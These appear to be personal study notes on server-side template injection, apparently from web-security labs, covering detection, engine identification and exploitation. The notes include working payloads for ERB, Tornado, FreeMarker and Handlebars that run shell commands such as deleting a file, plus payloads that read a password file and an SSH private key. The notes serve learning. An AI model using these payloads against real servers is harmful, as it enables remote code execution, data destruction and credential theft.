Server Side Template Injection:

	it occurs when user input is concatenated directly into a template, rather than passed in as data, which allows attacker to inject arbitary template directives in order to manipulate the template engine, as it evaluated server-side, makes it much more dangerous than a typical client-side template injection.

in php:

$loader = new Twig_Loader_array(['index' => $this.userinput]);
$this->Twig = new Twig_Environment($loader);
$this->Twig->render('index');

this is taking in user input, and rendering tthat input, this is a potential sink

process:

Detect -> Identify -> Exploit -> Read -> Explore -> Attack

Detect: 
	Fuzz the endpoints with special character and look for any character being interpreted server side
	in plain text context, you have to use {{ payload }},like {{ 4*4 }}
	in code context, engine.render("hello {{" + userinput + "}}"), this you have to use jus the code without {{}}, like 4*4, we can breakout of the sytax by pay}}<tag>

Identify:
	once you found the proper endpoit,find the template engine by the kind off error message it returns

Exploit:
?message=<%= system("rm /home/carlos/morale.txt") %>

me}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}

<#assign command="freemarker.template.utility.Execute"?new()> ${ command("rm /home/carlos/morale.txt") }

{{this.push "return require('child_process').exec('whoami);"}}

Explore:
	all engines expose self or enviromant object that will display all the objects and method thatt you have access from that context, and create custom exploits based on the avaible methods
There will be a lot of objects that are site specific which you can play around with

they might have sensistive information etc

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}

user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')}}{{user.gdprDelete()}}




